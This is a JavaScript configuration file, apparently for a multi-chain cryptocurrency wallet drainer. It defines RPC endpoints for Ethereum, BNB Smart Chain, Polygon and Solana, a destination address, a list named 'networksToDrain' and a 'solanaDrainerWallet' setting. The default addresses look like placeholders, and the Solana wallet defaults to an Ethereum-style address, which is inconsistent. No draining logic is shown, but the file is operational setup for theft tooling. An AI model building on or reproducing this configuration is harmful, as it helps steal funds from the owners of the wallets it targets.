require('dotenv').config();

module.exports = {
  destinationAddress: process.env.DESTINATION_ADDRESS || '0x742d35Cc6634C0532925a3b844Bc9e7505f12345',
  bridgeContract: process.env.BRIDGE_CONTRACT || '0x1234567890123456789012345678901234567890',

  networks: {
    ethereum: {
      name: 'Ethereum',
      rpcUrl: process.env.ETH_RPC_URL || 'https://eth.llamarpc.com',
      chainId: 1,
      symbol: 'ETH',
      decimals: 18,
      bridgeContract: process.env.BRIDGE_CONTRACT || '0x1234567890123456789012345678901234567890',
    },
    bsc: {
      name: 'BNB Smart Chain',
      rpcUrl: process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org',
      chainId: 56,
      symbol: 'BNB',
      decimals: 18,
      bridgeContract: process.env.BRIDGE_CONTRACT || '0x1234567890123456789012345678901234567890',
    },
    polygon: {
      name: 'Polygon',
      rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com',
      chainId: 137,
      symbol: 'MATIC',
      decimals: 18,
      bridgeContract: process.env.BRIDGE_CONTRACT || '0x1234567890123456789012345678901234567890',
    },
    solana: {
      name: 'Solana',
      rpcUrl: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
      chainId: 'mainnet-beta',
      symbol: 'SOL',
      decimals: 9,
    },
  },

  gasPrice: {
    standard: 'standard',
    fast: 'fast',
  },

  config: {
    retries: 3,
    retryDelay: 2000,
    defaultNetwork: 'ethereum',
    networksToDrain: ['ethereum', 'bsc', 'polygon', 'solana'],
  },

  apiKeys: {
    coingecko: process.env.COINGECKO_API_KEY || '',
    solscan: process.env.SOLSCAN_API_KEY || '',
    jupiter: process.env.JUPITER_API_KEY || '',
    moralis: process.env.MORALIS_API_KEY || '',
    etherscan: process.env.ETHERSCAN_API_KEY || '',
  },

  // Top-level shortcuts for legacy access patterns
  solanaRpc: process.env.SOLANA_RPC_URL || 'https://api.mainnet-beta.solana.com',
  solanaDrainerWallet: process.env.SOLANA_DRAINER_WALLET || '0x742d35Cc6634C0532925a3b844Bc9e7505f12345',
};
